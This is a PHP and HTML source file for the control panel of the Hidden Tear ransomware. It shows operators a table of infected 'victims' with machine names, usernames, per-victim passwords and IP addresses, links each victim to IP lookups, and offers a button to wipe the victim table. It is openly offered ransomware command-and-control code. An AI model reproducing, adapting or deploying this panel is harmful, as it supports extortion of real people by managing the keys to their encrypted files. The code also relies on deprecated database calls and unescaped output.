<html>
<head>
    <title>Hidden Tear Control Panel</title>
    <style>
  
    #bar{
        width: 10%;
    	float:right;
        margin-right: 20px;
        height: auto;
        margin-top: 10px;
    }
  	#puls{
        margin-top: 4px;
    	margin-right: 5px;
        float: right;
    	background-color: #DCDCDC;
        width: 100%;
        height: 30px;
        border-radius: 10px;
        cursor: pointer;
    }
    
      	#puls:hover{
        margin-top: 5px;
        margin-right: 5px;
        float: right;
    	background-color: #F8F8FF;
        width: 100%;
        height: 35px;
        border-radius: 10px;
        cursor: pointer;
    }
    
	table{
    	width: auto;
    	border: 3px solid black;
        margin-left: 1%;
        margin-right: 1%;
    }
    
    tr{
    	border: 3px solid black;
        margin: 3px;
    }
    
    td{
    	border: 1px solid black;
        margin: 3px;
        text-align: center;
    }
    
    h5{
		margin-top: 10px;
        margin-right: 15px;
        width: 100%;
		font-style: oblique;
        height: auto;
    }
    
    @media(max-width: 750px){
    	#bar{
        	float: none;
            width: 100%;
            margin-left: 1.5%;
        }
        
        table{
        	width: 100%;
            float: none;
            margin-top: 5%;
            height: auto;
            margin-left: 0%;
        }
        
        h5{
        	margin-left: 12%;
        }
    }
  </style>
</head>
<body>
	<div id="bar">
          <a href='./attacker_panel.php?destroy=true'><input  id="puls" type='button' value='Log Out'></a>
    	  <a href='./attacker_panel.php'><input id="puls" type='button' value='Refresh'></a>
          <a href='https://github.com/Virgula0/hidden-tear/issues' target="_blank"><input id="puls" type='button' value='Report An Issue'></a>
    	  <a href='./attacker_panel.php?clean=true'><input id="puls" type='button' value='Delete All Datas'></a>
    	  <h5>Panel Center Coded By Virgula0 AND Hidden Tear coded by Uktu Sen(Jan) </h5>
    </div>
</body>
</html>
<?php
    session_start();
	include 'connect_db.php';
    
    if (isset($_SESSION['LAST_ACTIVITY']) && (time() - $_SESSION['LAST_ACTIVITY'] > 1800)) {
      // 1800 = 30 minutes of inactivity
      session_unset();     
      session_destroy();   
	}
    $_SESSION['LAST_ACTIVITY'] = time(); // update last activity time stamp
    
    function destroy(){
    	session_unset(); 
        session_destroy();
        header ("Location: ./index.html");
        exit;
    }
    
    if ($_SESSION['user']['id'] == 3){
        	if (isset($_GET['destroy']) == "true" && !empty($_GET['destroy'])) {
      			destroy();         
  			}
            
            if (isset($_GET['clean']) == "true" && !empty($_GET['clean'])) {
				$sql = "TRUNCATE table victims";
        		$truncate = mysql_query($sql, $con) or die (mysql_error());
        		echo "Table Succesfully cleaned";
                exit;
            }
            
    		$sql_search = "SELECT * FROM victims";
            $ris = mysql_query($sql_search, $con) or die (mysql_error());
    		$found = mysql_num_rows($ris);
            	if($found > 0){
                   $link_1 = "http://www.checkip.com/ip/";
                   $link_2 = "http://whatismyipaddress.com/ip/";
                   echo "<div class='container'>";
                   echo "<table>";
                   echo "<tr>";
                   echo "<td> Machine Name</td>";
                   echo "<td> UserName</td>";
                   echo "<td> Password </td>";
                   echo "<td> Date </td>";
                   echo "<td> Ip </td>";
                   echo "<td> Get Info About target - Database 1 </td>";
                   echo "<td> Get Info About target - Database 2 </td>";
                   echo "</tr> <br />";
                    while($row = mysql_fetch_array($ris)) {
                   		$ip = $row['ip'];
                        $linkk = $link_1.$ip;
                        $linkk_2 = $link_2.$ip;
                        $link = "<a href=\"$linkk\" target=\"_blank\">Search</a>";
                        $link2 = "<a href=\"$linkk_2\" target=\"_blank\">Search</a>";
                        echo "<tr>";
                        echo "<td>" . $row['computer_name'] . "</td>";
                        echo "<td>" . $row['user_name'] .  "</td>";
                        echo "<td>" . $row['password'] ."</td>";
                        echo "<td>" . $row['date_time'] .  "</td>";
                        echo "<td>" . $row['ip'] . "</td>";
                        echo "<td>" . $link . "</td>";
                        echo "<td>" . $link2 . "</td>";
                        echo "</tr> ";
                   } 
                   echo "</table>";	
                   echo "</div>";
               }else{
               		echo "No hacked machines found yet";
               }
    }else{
    	echo "<script>alert('Acess Denied');</script>";
        header( "refresh:0;url=./index.html" );
        exit;
    }

?>
